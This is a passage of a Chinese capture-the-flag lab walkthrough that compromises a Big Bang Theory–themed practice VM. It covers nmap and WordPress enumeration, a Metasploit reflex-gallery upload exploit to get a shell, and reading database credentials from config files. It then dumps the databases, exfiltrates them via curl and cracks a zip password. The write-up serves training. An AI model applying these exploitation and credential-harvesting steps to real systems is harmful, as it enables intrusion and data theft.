((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">| http-robots.txt: 4 disallowed entries </span><br><span class="line">|_&#x2F;howard &#x2F;web_shell.php &#x2F;backdoor &#x2F;rootflag.txt</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Fun with flags!</span><br><span class="line">1337&#x2F;tcp open  waste?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: </span><br><span class="line">|_    FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port1337-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;3&#x2F;31%Time&#x3D;5E82D546%P&#x3D;x86_64-pc-linux-gnu%r(NU</span><br><span class="line">SF:LL,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(GenericLine</span><br><span class="line">SF:s,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(GetRequest,2</span><br><span class="line">SF:F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(HTTPOptions,2F,</span><br><span class="line">SF:&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(RTSPRequest,2F,&quot;F</span><br><span class="line">SF:LAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(RPCCheck,2F,&quot;FLAG-s</span><br><span class="line">SF:heldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(DNSVersionBindReqTCP,2F,</span><br><span class="line">SF:&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(DNSStatusRequestT</span><br><span class="line">SF:CP,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(Help,2F,&quot;FL</span><br><span class="line">SF:AG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(SSLSessionReq,2F,&quot;FL</span><br><span class="line">SF:AG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(TerminalServerCookie</span><br><span class="line">SF:,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(TLSSessionReq</span><br><span class="line">SF:,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(Kerberos,2F,&quot;</span><br><span class="line">SF:FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(SMBProgNeg,2F,&quot;FLA</span><br><span class="line">SF:G-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(X11Probe,2F,&quot;FLAG-she</span><br><span class="line">SF:ldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(FourOhFourRequest,2F,&quot;FLAG</span><br><span class="line">SF:-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(LPDString,2F,&quot;FLAG-she</span><br><span class="line">SF:ldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(LDAPSearchReq,2F,&quot;FLAG-she</span><br><span class="line">SF:ldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(LDAPBindReq,2F,&quot;FLAG-sheld</span><br><span class="line">SF:on&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(SIPOptions,2F,&quot;FLAG-sheldon&#123;</span><br><span class="line">SF:cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(LANDesk-RC,2F,&quot;FLAG-sheldon&#123;cf8</span><br><span class="line">SF:8b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(TerminalServer,2F,&quot;FLAG-sheldon&#123;cf</span><br><span class="line">SF:88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(NCP,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb1</span><br><span class="line">SF:0c4005c1f2781a069cf8&#125;\n&quot;)%r(NotesRPC,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c400</span><br><span class="line">SF:5c1f2781a069cf8&#125;\n&quot;)%r(JavaRMI,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f27</span><br><span class="line">SF:81a069cf8&#125;\n&quot;)%r(WMSRequest,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a</span><br><span class="line">SF:069cf8&#125;\n&quot;)%r(oracle-tns,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069</span><br><span class="line">SF:cf8&#125;\n&quot;)%r(ms-sql-s,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\</span><br><span class="line">SF:n&quot;)%r(afp,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(giop</span><br><span class="line">SF:,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;);</span><br><span class="line">MAC Address: 08:00:27:F7:18:EC (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.012 days (since Tue Mar 31 01:13:02 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;262 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<p>nmap在扫描结果中就给出了FLAG-sheldon<br />
实际上使用nc就能获得flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.1.105 1337</span><br><span class="line"></span><br><span class="line">FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;</span><br></pre></td></tr></table></figure>
<p><strong><code>FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;</code></strong></p>
<p>nmap在扫描时给出了80端口上<code>robots.txt</code>的相关信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http-robots.txt: 4 disallowed entries </span><br><span class="line">|_&#x2F;howard &#x2F;web_shell.php &#x2F;backdoor &#x2F;rootflag.txt</span><br></pre></td></tr></table></figure>
<p>测试之后发现只有<code>/howard</code>可以访问</p>
<h2 id="web路径枚举-14"><a class="markdownIt-Anchor" href="#web路径枚举-14"></a> Web路径枚举</h2>
<p>尝试爆破80端口下的Web路径</p>
<p><code>dirb http://192.168.1.105/ -w</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.1.105&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.1.105&#x2F;index.html (CODE:200|SIZE:239)                                        </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;javascript&#x2F;                                              </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;                                                   </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;phpmyadmin&#x2F;                                              </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;private&#x2F;                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.1.105&#x2F;robots.txt (CODE:200|SIZE:112)                                        </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.1.105&#x2F;server-status (CODE:403|SIZE:301)</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress&#x2F;</span><br></pre></td></tr></table></figure>
<p>可以看到存在phpmyadmin框架和wordpress框架</p>
<ul>
<li>访问<code>/private</code>，看起来像是一个自建的站点</li>
<li>尝试后发现<code>/private/login.php</code>，可以尝试SQL注入或者收集信息再进行登入爆破</li>
<li>访问<code>/howard</code></li>
<li><code>/howard/stolen_data/pennys_lastname.txt</code>中记录内容为<code>ERROR 404</code></li>
</ul>
<h2 id="漏洞利用-14"><a class="markdownIt-Anchor" href="#漏洞利用-14"></a> 漏洞利用</h2>
<p>使用wpscan对wordpress站点进行扫描</p>
<p><code>wpscan --url http://192.168.1.105/music/wordpress -e u</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] footprintsonthemoon</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] kripke</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] stuart</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
<p>得到三个账户的用户名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress -e ap</span><br><span class="line"></span><br><span class="line">[+] reflex-gallery</span><br><span class="line"> | Location: http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress&#x2F;wp-content&#x2F;plugins&#x2F;reflex-gallery&#x2F;</span><br><span class="line"> | Last Updated: 2019-05-10T16:05:00.000Z</span><br><span class="line"> | [!] The version is out of date, the latest version is 3.1.7</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 3.1.3 (80% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress&#x2F;wp-content&#x2F;plugins&#x2F;reflex-gallery&#x2F;readme.txt</span><br></pre></td></tr></table></figure>
<p>得到插件信息</p>
<p>搜索插件相关信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">searchsploit reflex gallery</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                       |  Path</span><br><span class="line">                                                                     | (&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;)</span><br><span class="line">--------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">WordPress Plugin Reflex Gallery - Arbitrary File Upload (Metasploit) | exploits&#x2F;php&#x2F;remote&#x2F;36809.rb</span><br><span class="line">WordPress Plugin Reflex Gallery 3.1.3 - Arbitrary File Upload        | exploits&#x2F;php&#x2F;webapps&#x2F;36374.txt</span><br><span class="line">--------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure>
<p>在MSF中搜索相关EXP</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">search reflex</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit&#x2F;unix&#x2F;webapp&#x2F;wp_reflexgallery_file_upload  2012-12-30       excellent  Yes    Wordpress Reflex Gallery Upload Vulnerability</span><br></pre></td></tr></table></figure>
<p>使用EXP</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;unix&#x2F;webapp&#x2F;wp_reflexgallery_file_upload</span><br><span class="line">set RHOSTS 192.168.1.105</span><br><span class="line">set TARGETURI &#x2F;music&#x2F;wordpress</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>成功获取Shell</p>
<h2 id="权限提升-14"><a class="markdownIt-Anchor" href="#权限提升-14"></a> 权限提升</h2>
<ul>
<li>FLAG-raz</li>
</ul>
<p>获取tty</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
<p>查看wordpress的数据库配置文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;www&#x2F;html&#x2F;music&#x2F;wordpress&#x2F;wp-config.php | grep -i db</span><br><span class="line"></span><br><span class="line">define( &#39;DB_NAME&#39;, &#39;footprintsonthemoon&#39; );</span><br><span class="line">define( &#39;DB_USER&#39;, &#39;footprintsonthemoon&#39; );</span><br><span class="line">define( &#39;DB_PASSWORD&#39;, &#39;footprintsonthemoon1337&#39; );</span><br><span class="line">define( &#39;DB_HOST&#39;, &#39;localhost&#39; );</span><br><span class="line">define( &#39;DB_CHARSET&#39;, &#39;utf8mb4&#39; );</span><br><span class="line">define( &#39;DB_COLLATE&#39;, &#39;&#39; );</span><br></pre></td></tr></table></figure>
<p>连接数据库<br />
<code>mysql -h localhost -u footprintsonthemoon -pfootprintsonthemoon1337 footprintsonthemoon</code></p>
<p>查看数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">+---------------------+</span><br><span class="line">| Database            |</span><br><span class="line">+---------------------+</span><br><span class="line">| information_schema  |</span><br><span class="line">| footprintsonthemoon |</span><br><span class="line">+---------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>退出mysql并导出数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br><span class="line">mysqldump -h localhost -u footprintsonthemoon -pfootprintsonthemoon1337 --databases footprintsonthemoon &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;dump.sql</span><br></pre></td></tr></table></figure>
<p>在Kali中下载备份</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -O http:&#x2F;&#x2F;192.168.1.105&#x2F;dump.sql</span><br></pre></td></tr></table></figure>
<p>查找flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat dump.sql | grep &quot;FLAG&quot; --color&#x3D;auto</span><br><span class="line"></span><br><span class="line">FLAG-raz&#123;40d17a74e28a62eac2df19e206f0987c&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里导出的数据在Kali中用grep节选时如果没有用高亮就很难找</p>
</blockquote>
<ul>
<li>FLAG-bernadette</li>
</ul>
<p>查看<code>/private</code>站点的数据库配置文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;www&#x2F;html&#x2F;private&#x2F;db_config.php | grep -i db</span><br><span class="line"></span><br><span class="line">$DBUSER &#x3D; &#39;bigpharmacorp&#39;;</span><br><span class="line">$DBPASS &#x3D; &#39;weareevil&#39;;</span><br><span class="line">$con&#x3D;mysqli_connect(&quot;127.0.0.1&quot;,$DBUSER,$DBPASS,&quot;bigpharmacorp&quot;);</span><br></pre></td></tr></table></figure>
<p>连接数据库<br />
<code>mysql -h localhost -u bigpharmacorp -pweareevil</code></p>
<p>查找flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| bigpharmacorp      |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">use bigpharmacorp；</span><br><span class="line"></span><br><span class="line">show tables;</span><br><span class="line">+-------------------------+</span><br><span class="line">| Tables_in_bigpharmacorp |</span><br><span class="line">+-------------------------+</span><br><span class="line">| products                |</span><br><span class="line">| users                   |</span><br><span class="line">+-------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">select * from users;</span><br><span class="line">+----+------------+----------------------------------+------------+---------------------------------------------------+</span><br><span class="line">| id | username   | password                         | fname      | description                                       |</span><br><span class="line">+----+------------+----------------------------------+------------+---------------------------------------------------+</span><br><span class="line">|  1 | admin      | 3fc0a7acf087f549ac2b266baf94b8b1 | josh       | Dont mess with me                                 |</span><br><span class="line">|  2 | bobby      | 8cb1fb4a98b9c43b7ef208d624718778 | bob        | I like playing football.                          |</span><br><span class="line">|  3 | penny69    | cafa13076bb64e7f8bd480060f6b2332 | penny      | Hi I am Penny I am new here!! &lt;3                  |</span><br><span class="line">|  4 | mitsos1981 | 05d51709b81b7e0f1a9b6b4b8273b217 | dimitris   | Opa re malaka!                                    |</span><br><span class="line">|  5 | alicelove  | e146ec4ce165061919f887b70f49bf4b | alice      | Eat Pray Love                                     |</span><br><span class="line">|  6 | bernadette | dc5ab2b32d9d78045215922409541ed7 | bernadette | FLAG-bernadette&#123;f42d950ab0e966198b66a5c719832d5f&#125; |</span><br><span class="line">+----+------------+----------------------------------+------------+---------------------------------------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p><strong><code>FLAG-bernadette&#123;f42d950ab0e966198b66a5c719832d5f&#125;</code></strong></p>
<ul>
<li>FLAG-amy</li>
</ul>
<p>收集信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;home&#x2F;amy&#x2F;</span><br><span class="line">total 12</span><br><span class="line">-rwxrwxrwx 1 amy amy  434 Mar  4 16:30 notes.txt</span><br><span class="line">-rwxr-xr-x 1 amy amy 7488 Mar  6 00:06 secretdiary</span><br><span class="line"></span><br><span class="line">cat &#x2F;home&#x2F;amy&#x2F;notes.txt</span><br><span class="line">This is my secret diary.</span><br><span class="line">The safest way to keep my secrets is inside a compiled executable program.</span><br><span class="line">As soon as I get popular now, that I have friends, I will start adding my secrets here.</span><br><span class="line">I have used a really strong password that it cant be bruteforced.</span><br><span class="line">Seriously it is 18 digit, alphanumeric, uppercase&#x2F;lowercase with symbols.</span><br><span class="line">And since my program is already compiled, no one can read the source code in order to view the password!</span><br></pre></td></tr></table></figure>
<p>可以判断<code>/home/amy/secretdiary</code>是一个可执行程序</p>
<p>使用strings命令查看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">strings secretdiary</span><br><span class="line"></span><br><span class="line">P@SSw0rd123Sh3ld0n</span><br><span class="line">Login Success!</span><br><span class="line">Soon I will be adding my secrets here..</span><br><span class="line">FLAG-amy&#123;60263777358690b90e8dbe8fea6943c9&#125;</span><br></pre></td></tr></table></figure>
<p><strong><code>FLAG-amy&#123;60263777358690b90e8dbe8fea6943c9&#125;</code></strong></p>
<ul>
<li>FLAG-penny</li>
</ul>
<p>收集信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ls -la &#x2F;home&#x2F;penny</span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x  4 penny penny 4096 Mar  6 00:37 .</span><br><span class="line">drwxr-xr-x 10 root  root  4096 Mar  4 02:33 ..</span><br><span class="line">-rw-rw-r--  1 penny penny   61 Mar  5 00:26 .FLAG.penny.txt</span><br><span class="line">-rw-------  1 penny penny   57 Mar  6 00:47 .bash_history</span><br><span class="line">-rw-r--r--  1 penny penny  220 Sep  1  2015 .bash_logout</span><br><span class="line">-rw-r--r--  1 penny penny 3771 Sep  1  2015 .bashrc</span><br><span class="line">drwx------  2 penny penny 4096 Mar  6 00:37 .cache</span><br><span class="line">drwxrwxr-x  2 penny penny 4096 Mar  5 00:26 .nano</span><br><span class="line">-rw-r--r--  1 penny penny  655 May 16  2017 .profile</span><br><span class="line"></span><br><span class="line">cat &#x2F;home&#x2F;penny&#x2F;.FLAG.penny.txt</span><br><span class="line">RkxBRy1wZW5ueXtkYWNlNTJiZGIyYTBiM2Y4OTlkZmIzNDIzYTk5MmIyNX0&#x3D;</span><br></pre></td></tr></table></figure>
<p>base64 decode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;RkxBRy1wZW5ueXtkYWNlNTJiZGIyYTBiM2Y4OTlkZmIzNDIzYTk5MmIyNX0&#x3D;&quot; | base64 -d</span><br><span class="line">FLAG-penny&#123;dace52bdb2a0b3f899dfb3423a992b25&#125;</span><br></pre></td></tr></table></figure>
<p><strong><code>FLAG-penny&#123;dace52bdb2a0b3f899dfb3423a992b25&#125;</code></strong></p>
<ul>
<li>FLAG-howard</li>
</ul>
<p>将FTP根目录打包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -r &#x2F;var&#x2F;www&#x2F;html&#x2F;ftp.zip &#x2F;var&#x2F;ftp</span><br></pre></td></tr></table></figure>
<p>在Kali下载并解压</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O http:&#x2F;&#x2F;192.168.1.105&#x2F;ftp.zip</span><br><span class="line">unzip ftp.zip</span><br></pre></td></tr></table></figure>
<p>收集信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ls -l var&#x2F;ftp&#x2F;pub&#x2F;howard</span><br><span class="line">total 36</span><br><span class="line">-rw-r--r-- 1 root root   273 Mar  3 17:05 note.txt</span><br><span class="line">-rw-r--r-- 1 root root 30762 Mar  5 19:29 super_secret_nasa_stuff_here.zip</span><br><span class="line"></span><br><span class="line">cat var&#x2F;ftp&#x2F;pub&#x2F;howard&#x2F;note.txt</span><br><span class="line">Please go away, nothing interesing here. I just had to temporary store some nasa data here</span><br><span class="line">because my laptop had a virus from some weird websites I visited ... anyway ...</span><br><span class="line">And don&#39;t bother looking at my secret data  I have encrypted them pretty well. I am an MIT  engineer!</span><br></pre></td></tr></table></figure>
<p>爆破压缩包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -u super_secret_nasa_stuff_here.zip</span><br><span class="line">PASSWORD FOUND!!!!: pw &#x3D;&#x3D; astronaut</span><br><span class="line"></span><br><span class="line">unzip -P astronaut super_secret_nasa_stuff_here.zip</span><br><span class="line">Archive:  super_secret_nasa_stuff_here.zip</span><br><span class="line">  inflating: marsroversketch.jpg</span><br></pre></td></tr></table></figure>
<p>隐写爆破</p>
